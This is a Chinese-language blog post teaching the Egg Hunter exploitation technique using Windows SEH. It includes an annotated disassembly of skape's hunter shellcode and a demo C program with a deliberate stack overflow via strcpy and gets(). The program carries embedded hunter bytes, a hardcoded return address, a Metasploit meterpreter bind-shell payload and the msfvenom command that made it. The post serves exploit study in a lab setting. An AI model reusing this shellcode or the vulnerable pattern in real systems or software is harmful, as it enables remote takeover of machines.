---
layout: post
title: 【note】利用Windows的SEH学习Egg Hunter
date: 2019-6-30
categories: blog
tags: SEH
description: 
---

## 简介
最近看到一种比较有意思的利用溢出利用手段，叫做Egg Hunter，貌似中文翻译为寻找复活节彩蛋。

先简单介绍下什么是Egg Hunter，顾名思义，Egg Hunter由两部分组成，一部分是Egg，一部分是Hunter。在溢出的场景中，溢出的字节有限的情况下，比较大的shellcode(Egg)塞不进去，那就把大的shellcode放到内存的其他地方，在有限的溢出空间中用小的shellcode(Hunter)，去寻找大的shellcode来执行。

Egg就是大的shellcode，Hunter就是小的shellcode。类比于web漏洞挖掘中的“小马传大马”。

在查阅相关资料发现，这种技术最早应该是由skape在2004年提出的，文章叫《Safely Searching Process Virtual Address Space》。链接如下：

>http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

## 基本原理
1. Egg Hunter

《Safely Searching Process Virtual Address Space》对Egg Hunter介绍的比较详细了，如果感兴趣的可以去读原文。

一句话介绍原理：全内存扫描带有指定关键字的代码。

因此Egg Hunter主要是如下两个关键点：

1) 内存扫描

一般的做法是直接从0x0000开始，通过递增地址，来取内存的值。但是程序运行的内存不是所有地址都能正常访问，比如几乎所有程序的0x0000都不可访问，所以需要有一个判断内存是否可访问的逻辑。

在Skape的文章中罗列了几种判断方式：

Linux下使用access、sigaction等内核函数来做判断，如果地址不可访问，这些函数会返回0xf2。

Windows下也有类似的函数，如IsBadReadPtr、NtDisplayString函数。

注：metasploit生成的Egg hunter使用的是NtAccessCheckAndAuditAlarm函数，原理一致。

如果当前地址不可访问，则跳到下一个内存页。因为内存一般都是4k大小页对齐的，所以当前地址无法访问则可以判定该地址所在内存页都无法访问，可以提高扫描速度。

这一步骤也是Egg Hunter的核心，可能花费较长的时间，而且可能造成CPU使用率飙升。在实际应用中可以结合场景进行优化，例如Egg放到了栈中，则可以从栈顶开始搜索。具体情况具体分析，骚姿势可以有很多。

2) 对比关键字

由于需要扫描内存来找到我们的Egg，那么一定要有个独特的标记，来表示我们找到了。因此不建议直接拿shellcode的前几个字节作为标记(不够独特)，而是由我们自己指定标记，如0x50905090、0x5a5a5a5a等等，反正就是要独特，然后放到shellcode的前面。

这里需要注意的是，我们的标记虽然独特了，但是在内存中除了Egg具有这个标记，Hunter页带了这个标记(毕竟是要做比较的)。。。

为了解决这个问题，Skape的建议是Egg的标记重复两次，比如Egg的开头是0x5090509050905090，Hunter在比较的时候，连续比较两次0x50905090，则认为找到Egg。

2. SEH

如果看了Skape文章的话，会发现在判断内存是否可以访问的逻辑中，除了调用内核函数直接判断，他还提出了在Windows下可以利用SEH的方式来处理。

SEH全称structured exception handling，简单来说就是异常处理。应用在Egg Hunter中，就是在出现地址不可访问的时候，直接到SEH中进行统一的处理，来屏蔽这个异常。

Windows采用了链表的方式来构造，在出现异常的时候通过遍历链表，找到第一个能处理异常的SEH来执行。

SEH的结构体如下：

```
typedef struct _EXCEPTION_REGISTRATION_RECORD
{
struct _EXCEPTION_REGISTRATION_RECORD *Next;    //这里指向链表中的下一个SEH
EXCEPTION_DISPOSITION (*Handler)(
struct _EXCEPTION_RECORD *record,
void *frame,
struct _CONTEXT *ctx,
void *dispctx);
} EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;
```

SEH链表头为fs:[0]，fs是一个段寄存器，fs:[0]指向第一个SEH结构体的地址。第一个SEH结构体通过Next指针指向下一个SEH结构体。

在c语言中，我们可以在代码中通过try/exception来自己注册SEH，如下：

```
int main()
{
    __try   //可以编译一个程序通过IDA查看，发现在__try之前，编译器就帮忙注册了相应的SEH
    {
        //TODO
    }
    __except(MyExceptionhander()){} 
}
```

但是我们的Hunter又不是在编译阶段塞到程序里的，因此我们想要用一个SEH来处理内存地址访问异常，那就需要自己注册一个SEH。

既然SEH本身是个链表结构，那注册的方式就简单了，直接把fs:[0]的地址指向我们的SEH即可，为了避免SEH链表出现异常，我们在自己的SEH结构体中把Next指向0xffffffff，这样注册完，整个SEH链表中就只有我们这一个SEH了。

## ShellCode分析

Skape给出利用SEH的Egg Hunter的shellcode如下，我们可以分为三部分来看：

```
***************第一部分：注册SEH***************
00000000 EB21       jmp short 0x23      //这里开头就跳到0x23，然后在call回来，是为了获取SEH处理函数的地址
00000002 59         pop ecx             //将SEH处理函数的地址放入ecx
00000003 B890509050 mov eax,0x50905090
00000008 51         push ecx            //SEH结构体中的handler
00000009 6AFF       push byte -0x1      //SEH结构体中的Next
0000000B 33DB       xor ebx,ebx
0000000D 648923     mov [fs:ebx],esp    //将SEH注册到fs:[0]
***************第二部分：扫描内存***************
00000010 6A02       push byte +0x2      
00000012 59         pop ecx             //ecx=2，作为循环变量，repe scasd可执行两次
00000013 8BFB       mov edi,ebx         //edi就是当前地址
00000015 F3AF       repe scasd          //比较edi和eax，eax是上文的0x50905090，也是访问发生异常的地方
00000017 7507       jnz 0x20            //比较失败
00000019 FFE7       jmp edi             //比较成功，直接跳去edi执行shellcode
0000001B 6681CBFF0F or bx,0xfff         //异常处理后的返回到这里，跳到下一内存页
00000020 43         inc ebx             //扫描地址+1
00000021 EBED       jmp short 0x10      //继续扫描
00000023 E8DAFFFFFF call 0x2
***************第三部分：SEH处理函数***************
00000028 6A0C       push byte +0xc      
0000002A 59         pop ecx
0000002B 8B040C     mov eax,[esp+ecx]   //esp+0xc是SEH handler的第三个入参struct _CONTEXT *ctx
0000002E B1B8       mov cl,0xb8
00000030 83040806   add dword [eax+ecx],byte +0x6   //*ctx+0xb8是SEH处理完成后返回的eip，发生访问异常的地址0x00000015，将其+0x6后，返回到0x0000001B
00000034 58         pop eax             //后续是为了维护堆栈平衡，保留返回地址，并将handler的四个入参弹栈，不过多赘述
00000035 83C410     add esp,byte +0x10
00000038 50         push eax
00000039 33C0       xor eax,eax
0000003B C3         ret
```

## 实战

为了演示该Egg Hunter是如何工作的，写了个程序，演示环境如下
```
操作系统:   Windows 2000(建议使用Virtual Box)
编译器：    VC6.0 (建议使用release版本调试)
调试器：    OllyDbg
```

演示程序模拟了一个邮件发送逻辑，填写message和email address，并备份email address。

其中备份email address的函数中存在栈溢出，但是溢出的空间有限，加返回地址仅64字节。

我们可以通过message，向内存中预先写入大的shellcode，如打开443端口，并接收metasploit的连接。在email address这个有限的空间中写入我们的Egg Hunter，去寻找我们的大的shellcode。

代码如下：
```
#include <windows.h>
#include <stdio.h>

void email_backup(char * input)
{
    char buf[56];
    //__asm int 3;
    strcpy(buf, input);     //此处栈溢出
    return;
}

main()
{
    /*unsigned char message[] = "\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a"    //EGG标志位: ZZZZZZZZ
    //shellcode为metasploit生成的，在本机打开443端口方便远控，msf的命令如下：
    //msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LPORT=443 -e x86/alpha_mixed -b "\x00\xd5\x0a\x0d\x1a\x03" -f c
        "\xbf\xac\xf2\x9c\xfd\xda\xdb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
        "\x4e\x83\xc2\x04\x31\x7a\x0f\x03\x7a\xa3\x10\x69\x01\x53\x56"
        "\x92\xfa\xa3\x37\x1a\x1f\x92\x77\x78\x6b\x84\x47\x0a\x39\x28"
        "\x23\x5e\xaa\xbb\x41\x77\xdd\x0c\xef\xa1\xd0\x8d\x5c\x91\x73"
        "\x0d\x9f\xc6\x53\x2c\x50\x1b\x95\x69\x8d\xd6\xc7\x22\xd9\x45"
        "\xf8\x47\x97\x55\x73\x1b\x39\xde\x60\xeb\x38\xcf\x36\x60\x63"
        "\xcf\xb9\xa5\x1f\x46\xa2\xaa\x1a\x10\x59\x18\xd0\xa3\x8b\x51"
        "\x19\x0f\xf2\x5e\xe8\x51\x32\x58\x13\x24\x4a\x9b\xae\x3f\x89"
        "\xe6\x74\xb5\x0a\x40\xfe\x6d\xf7\x71\xd3\xe8\x7c\x7d\x98\x7f"
        "\xda\x61\x1f\x53\x50\x9d\x94\x52\xb7\x14\xee\x70\x13\x7d\xb4"
        "\x19\x02\xdb\x1b\x25\x54\x84\xc4\x83\x1e\x28\x10\xbe\x7c\x24"
        "\xd5\xf3\x7e\xb4\x71\x83\x0d\x86\xde\x3f\x9a\xaa\x97\x99\x5d"
        "\xcd\x8d\x5e\xf1\x30\x2e\x9f\xdb\xf6\x7a\xcf\x73\xdf\x02\x84"
        "\x83\xe0\xd6\x31\x8f\x47\x89\x27\x72\x1d\x28\xc2\x8f\x89\xc0"
        "\x1d\x4f\xa9\xea\xf7\xf8\x41\x17\xf8\x07\x2a\x9e\x1e\x6d\x5c"
        "\xf7\x89\x1a\x9e\x2c\x02\xbc\xe1\x06\xe8\x82\x68\xf1\xa4\x6a"
        "\x25\xe8\x73\x94\xb6\x3e\xd4\x02\x3c\x2d\xe0\x33\x43\x78\x40"
        "\x23\xd3\xf6\x01\x06\x42\x06\x08\xf2\x84\x92\xb7\x55\xd3\x0a"
        "\xba\x80\x13\x95\x45\xe7\x20\xd2\xba\x76\x0b\xa8\x8d\xec\x13"
        "\xc6\xf1\xe0\x93\x16\xa4\x6a\x93\x7e\x10\xcf\xc0\x9b\x5f\xda"
        "\x75\x30\xca\xe5\x2f\xe4\x5d\x8e\xcd\xd3\xaa\x11\x2e\x36\xa9"
        "\x56\xd0\xc7\xa9\xa7\x13\x1e\x70\xd2\x7a\xa2\xc7\xed\xc9\x87"
        "\x6e\x64\x31\x9b\x71\xad";
    char email[] =
    //Hunter
        "\xeb\x21\x59\xb8"
        "\x5a\x5a\x5a\x5a\x51\x6a\xff\x33"
        "\xdb\x64\x89\x23\x6a\x02\x59\x8b"
        "\xfb\xf3\xaf\x75\x07\xff\xe7\x66"
        "\x81\xcb\xff\x0f\x43\xeb\xed\xe8"
        "\xda\xff\xff\xff\x6a\x0c\x59\x8b"
        "\x04\x0c\xb1\xb8\x83\x04\x08\x06"
        "\x58\x83\xc4\x10\x50\x33\xc0\xc3"
        "\xe0\xfd\x12\x00";     //0x0012fde0是栈溢出后的返回地址，指向Hunter的起始地址，需结合实际环境进行调整
    */
    char message[1024];
    char email[256];
    printf("Please input message:\n");
    gets(message);
    printf("This is your message: %s\n", message);
    printf("Please input email address:\n");
    gets(email);
    printf("This is your email address: %s\n", email);
    email_backup(email);
    return 0;
}
```